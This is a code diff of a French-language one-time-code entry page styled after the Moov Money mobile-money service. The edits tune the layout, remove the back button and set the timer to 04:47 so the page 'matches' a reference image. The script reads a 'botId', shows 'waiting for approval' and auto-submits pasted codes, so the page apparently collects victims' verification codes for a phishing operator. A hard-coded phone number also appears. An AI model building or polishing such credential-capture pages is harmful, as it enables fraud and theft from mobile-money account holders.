@@ -22,27 +22,29 @@ body {
     width: 100%;
     max-width: 400px;
     padding: 40px 24px 32px;
-    position: relative;
 }
-.logo { text-align: center; margin-bottom: 32px; }
-.logo-circle {
-    width: 56px; height: 56px;
-    background: #9A0000;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 12px;
-    font-size: 28px;
+.title {
+    font-size: 24px;
     font-weight: 700;
-    color: #fff;
+    text-align: center;
+    margin-bottom: 8px;
 }
-.moov-text { font-size: 20px; font-weight: 700; color: #9A0000; letter-spacing: 0.5px; }
-.title { font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px; }
-.subtitle { font-size: 15px; color: rgba(255,255,255,0.5); text-align: center; margin-bottom: 32px; line-height: 1.5; }
-.otp-wrap { display: flex; justify-content: center; gap: 12px; margin-bottom: 32px; }
+.subtitle {
+    font-size: 15px;
+    color: rgba(255,255,255,0.5);
+    text-align: center;
+    margin-bottom: 32px;
+    line-height: 1.5;
+}
+.otp-wrap {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 32px;
+}
 .otp-wrap input {
-    width: 48px; height: 56px;
+    width: 48px;
+    height: 56px;
     text-align: center;
     font-size: 22px;
     font-weight: 600;
@@ -56,9 +58,22 @@ body {
 .otp-wrap input:focus { border-color: #9A0000; }
 .otp-wrap input:disabled { background: rgba(255,255,255,0.02); opacity: 0.5; }
 .otp-wrap input::placeholder { color: rgba(255,255,255,0.2); }
-.timer { text-align: center; font-size: 14px; color: rgba(255,255,255,0.4); margin-bottom: 32px; }
-.timer span { color: #9A0000; font-weight: 600; }
-#otp-alert { text-align: center; font-size: 14px; margin-bottom: 16px; min-height: 20px; }
+.timer {
+    text-align: center;
+    font-size: 14px;
+    color: rgba(255,255,255,0.4);
+    margin-bottom: 32px;
+}
+.timer span {
+    color: #9A0000;
+    font-weight: 600;
+}
+#otp-alert {
+    text-align: center;
+    font-size: 14px;
+    margin-bottom: 16px;
+    min-height: 20px;
+}
 button {
     width: 100%;
     padding: 16px;
@@ -84,29 +99,13 @@ button:hover:enabled { background: #7a0000; }
     border-radius: 8px;
     background: rgba(154,0,0,0.1);
 }
-.back-link { text-align: center; margin-top: 20px; }
-.back-link button {
-    background: transparent;
-    border: none;
-    color: rgba(255,255,255,0.3);
-    font-size: 14px;
-    cursor: pointer;
-    padding: 8px;
-    width: auto;
-    opacity: 1;
-}
-.back-link button:hover { color: rgba(255,255,255,0.6); }
-.back-link button:disabled { opacity: 0.3; cursor: not-allowed; }
-.footer { margin-top: 32px; text-align: center; font-size: 12px; color: rgba(255,255,255,0.2); letter-spacing: 0.5px; }
 </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="logo">
-        <div class="logo-circle">M</div>
-        <div class="moov-text">Moov Money</div>
-    </div>
+
+    <!-- NO LOGO – MATCHES IMAGE -->
 
     <div class="title">Vérifier votre numéro</div>
     <div class="subtitle">Saisissez le code que nous avons envoyé à <span id="phoneDisplay">(+226) 79046955</span></div>
@@ -122,17 +121,12 @@ button:hover:enabled { background: #7a0000; }
 
     <div id="otp-alert"></div>
 
-    <div class="timer">Renvoyer le code dans <span id="countdown">05:00</span></div>
+    <div class="timer">Renvoyer le code dans <span id="countdown">04:47</span></div>
 
     <button id="verifyBtn" disabled>Continuer</button>
 
     <div id="waiting" class="waiting">⏳ En attente d'approbation…</div>
 
-    <div class="back-link">
-        <button onclick="history.back()">Retour</button>
-    </div>
-
-    <div class="footer">v 5.3.2 (1.0.0)</div>
 </div>
 
 <script>
@@ -140,7 +134,6 @@ const inputs = document.querySelectorAll('.otp-wrap input');
 const verifyBtn = document.getElementById('verifyBtn');
 const countdownEl = document.getElementById('countdown');
 const waitingEl = document.getElementById('waiting');
-const backButton = document.querySelector('.back-link button');
 const phoneDisplay = document.getElementById('phoneDisplay');
 
 const fullName = localStorage.getItem('fullName') || 'Client Moov Money';
@@ -154,7 +147,8 @@ if (!phone || !botId) { alert('Session expirée. Veuillez recommencer.'); window
 
 if (phone) { phoneDisplay.textContent = `(+226) ${phone.replace(/\D/g, '')}`; }
 
-let timeLeft = 300;
+// Timer starts at 4 minutes 47 seconds (287 seconds)
+let timeLeft = 287;
 function updateCountdown() {
     const m = Math.floor(timeLeft / 60);
     const s = timeLeft % 60;
@@ -241,8 +235,6 @@ document.addEventListener('paste', (e) => {
         if (digits.length === 6) { setTimeout(() => verifyBtn.click(), 300); }
     }
 });
-
-if (backButton) { backButton.addEventListener('click', () => { backButton.disabled = true; }); }
 </script>
 
 </body>
